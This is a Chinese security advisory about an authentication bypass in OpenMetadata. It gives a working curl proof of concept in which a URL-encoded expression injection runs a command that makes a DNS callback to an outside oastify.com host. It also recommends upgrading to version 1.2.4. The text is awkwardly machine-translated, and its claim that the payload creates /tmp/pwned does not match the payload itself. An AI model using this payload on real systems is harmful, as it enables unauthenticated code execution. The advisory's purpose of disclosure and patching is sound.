#  【漏洞预警】OpenMetadata 身份验证绕过漏洞   
cexlife  飓风网络安全   2024-04-24 22:43  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibhQpAia4xu025WOeXJDD9ib9emKB3QQRyVT9dibY2iblNla2BibcYr4iaQYtwjYiavU0AjGeKwEHbMfxOV9QzoXBXNo8g/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/ibhQpAia4xu025WOeXJDD9ib9emKB3QQRyVwEarI2LIu0Y5nZuDPQfzgCo0EqjUbbiaJFknMNZtITDPmzY2J8Lxu0A/640?wx_fmt=png&from=appmsg "")  
  
一个新的请求,该请求的路径进行核对这一清单  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibhQpAia4xu025WOeXJDD9ib9emKB3QQRyVAT1wVVPyibj4QI9Gj7PzYQId4ibMicmVC20VUMFGOZvqfJHHics4j6uVzA/640?wx_fmt=png&from=appmsg "")  
  
攻击者可能使用的路径参数作任何路径包含任何任意字符串，例如，一个请求 GET /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/111 将与排除的端点的条件,并因此将是处理与没有验证允许的一个攻击者以绕过认证机制,并达到任何任意的终结点,包括上面列出的,导致任意的表达的注射。  
  
curl 'http://localhost:8585/api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/%54%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%54%28%6a%61%76%61%2e%75%74%69%6c%2e%42%61%73%65%36%34%29%2e%67%65%74%44%65%63%6f%64%65%72%28%29%2e%64%65%63%6f%64%65%28%22%62%6e%4e%73%62%32%39%72%64%58%41%67%61%58%70%73%4e%7a%45%33%62%33%42%69%62%57%52%79%5a%57%46%6f%61%33%4a%6f%63%44%4e%72%63%32%70%72%61%47%4a%75%4d%6d%4a%7a%65%6d%67%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%3d%22%29%29%29'   
  
验证一个文件叫 /tmp/pwned是建立在OpenMetadata服务器**影响:**这个问题可能会导致认证旁路**正式防护方案:**  
  
官方已经发布了修复补丁,请立即更新到安全版本:  
  
OpenMetadata>=1.2.4  
  
**下载链接:**  
  
https://github.com/open-metadata/OpenMetadata/releases   
  
  
